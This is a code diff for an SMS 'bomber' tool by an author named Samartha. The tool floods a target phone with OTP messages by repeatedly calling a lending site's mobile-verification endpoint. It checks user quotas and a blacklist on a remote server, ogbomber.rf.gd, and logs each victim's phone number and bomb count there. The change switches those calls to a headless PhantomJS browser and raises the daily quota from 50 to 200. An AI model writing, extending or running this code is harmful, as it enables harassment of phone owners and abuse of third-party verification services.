@@ -1,21 +1,25 @@
 #bomber functions
 #author : Samartha
 import requests
+from selenium import webdriver
 import getpass
 import json
 import time
 un=getpass.getuser();
+driver = webdriver.PhantomJS()
 def ifExists(un):
-    request_string="http://ogbomber.rf.gd/ogbomber/isExist.php?un="+un
-    exists_response=requests.get(request_string).text
+    request_string="http://ogbomber.rf.gd/isExist.php?un="+un
+    driver.get(request_string)
+    exists_response=driver.find_element_by_id("result").text
     if 'true' in exists_response:
         return True
     elif 'false' in exists_response:
         return False
 
 def blackList(phno):
-    request_string="http://ogbomber.rf.gd/ogbomber/blackList.php"
-    bl=requests.get(request_string).text
+    request_string="http://ogbomber.rf.gd/blackList.php"
+    driver.get(request_string)
+    bl=driver.find_element_by_id("result").text
     bl_json=json.loads(bl)
     for i in bl_json:
         if int(i)==int(phno):
@@ -23,18 +27,20 @@ def blackList(phno):
     return True
 
 def getUserDetails(un):
-    request_string="http://ogbomber.rf.gd/ogbomber/userDetails.php?un="+un
-    user_details=requests.get(request_string).text.split('\x00',2)[1]
+    request_string="http://ogbomber.rf.gd/userDetails.php?un="+un
+    driver.get(request_string)
+    user_details=driver.find_element_by_id("result").text
     user_details_json=json.loads(user_details)
     u=user_details_json
     return u
 
 def checkQuota(x):
-    request_string="http://ogbomber.rf.gd/ogbomber/checkQuota.php?id="+x["uid"]
-    daily_quota=requests.get(request_string).text.split('\x00',2)[1]
+    request_string="http://ogbomber.rf.gd/checkQuota.php?id="+x["uid"]
+    driver.get(request_string)
+    daily_quota=driver.find_element_by_id("result").text
     try:
         int(daily_quota)
-        if int(daily_quota)<50:
+        if int(daily_quota)<200:
             return True
         else:
             return False
@@ -175,9 +181,10 @@ def startBombing(pn,cc,n,un):
         response = requests.post('https://indialends.com/internal/a/mobile-verification_v2.ashx', headers=headers, cookies=cookies, data=data)
         i-=1
     u=getUserDetails(un)
-    request_string="http://ogbomber.rf.gd/ogbomber/insertBomb.php?id="+u["uid"]+"&pn="+pn+"&n="+str(n)
-    response=requests.get(request_string).text
-
+    request_string="http://ogbomber.rf.gd/insertBomb.php?id="+u["uid"]+"&pn="+pn+"&n="+str(n)
+    driver.get(request_string)
+    response=driver.find_element_by_tag_name("body").text
+    print("::Bombed Successfully::\n::Inserted into database::")
 def checkConnectivity():
     url='http://www.google.com/'
     timeout=5
